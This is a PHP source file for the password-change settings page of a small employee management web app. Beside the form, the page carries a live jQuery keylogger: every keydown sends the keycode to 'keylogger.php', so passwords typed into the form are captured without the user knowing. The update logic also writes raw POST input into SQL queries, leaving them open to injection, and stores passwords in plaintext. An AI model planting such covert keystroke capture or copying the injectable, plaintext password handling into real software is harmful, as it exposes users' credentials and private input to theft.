<?php 
include('header.php');
if(isset($_POST['submit']))
{
	$old_password = $_POST['old_password'];
	$new_password = $_POST['new_password'];
	$con_password = $_POST['con_password'];
	if($new_password == $con_password)
	{
		if($row_header['Password'] == $old_password)
		{
			if(substr($_SESSION['login_id'],0,4) == 'admi')
			{
			$query = mysql_query("UPDATE admin SET Password = '$new_password' WHERE User_id = '$user_id'");
			}
			elseif(substr($_SESSION['login_id'],0,4) == 'emp_')
			{
			$query = mysql_query("UPDATE employee SET Password = '$new_password' WHERE User_id = '$user_id'");
			}
		}
	}
}
?> 
 
   
   <?php
	if(substr($_SESSION['login_id'],0,4) == 'admi')
	{
	
	?> 
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="manage_emp.php">
        <div class="large-2 column">
       	 Manage Emp
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" >
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
        <a href="signup.php">
        <div class="large-2 column">
         Add New User
        </div>
        </a>
        
        <a href="setting.php">
        <div class="large-2 column" style="background:#10255F;">
        Setting
        </div>
        </a>
        
    </div>
    <!-- end navigation bar -->
    
  	<?php
	}
    elseif(substr($_SESSION['login_id'],0,4) == 'emp_')
	{
		
	?>
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="company_detail.php">
        <div class="large-2 column">
       	 Company
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column" >
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
      
        
        <a href="setting.php">
        <div class="large-2 column" style="background:#10255F;" >
        Setting
        </div>
        </a>
        
         <a href="logout.php">
        <div class="large-2 column">
         Logout
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    <?php
	}
	?> 

    <script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board...
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=setting');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->
    


    
    <!-- start main heading -->
    <div class="row">
    	<div class="large-3 column main_heading">
        Setting
        </div>
        <div class="large-6 large-offset-1 column main_heading end">
        <span class="success_msg" style="color:#F00;">
        <?php 
		if(isset($_POST['submit']))
		{
			if($new_password == $con_password)
			{
				if($row_header['Password'] == $old_password)
				{
					echo "Your Password Successfully Change";
				}
				else{
					echo "Old Password Does Not Match..!!";
				}
			}
			else{
				echo "New Password and Confirm Password Does Not Match..!!";
				}
		}
		?>
        
        </span>
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    
    
   <!-- start manage employee -->
   <div class="manage_emp">
   <form action="setting.php" method="post">
       <div class="row">
            <div class="large-3 large-offset-3 column emp_name">
            Old Password :
            </div>
            <div class="large-3 column end">
            <input type="password" name="old_password" required="required">
            </div>
       </div>
       
       <div class="row">
            <div class="large-3 large-offset-3 column emp_name">
            New Password :
            </div>
            <div class="large-3 column end">
            <input type="password" name="new_password" required="required" >
            </div>
       </div>
       
        <div class="row">
            <div class="large-3 large-offset-3 column emp_name">
            Confirm Password :
            </div>
            <div class="large-3 column end">
            <input type="password" name="con_password" required="required">
            </div>
       </div>
       
        <div class="row">
            <div class="large-2 large-offset-5 column emp_name">
            <input type="submit" name="submit" value="Submit">
            </div>
       </div>
       
       </form>
   
       
       
   </div>
   <!-- end manage employee -->
   
 
   
   <script>
   		$(".success_msg").delay(2000).slideUp(1000)

   </script>
   
</body>
</html>
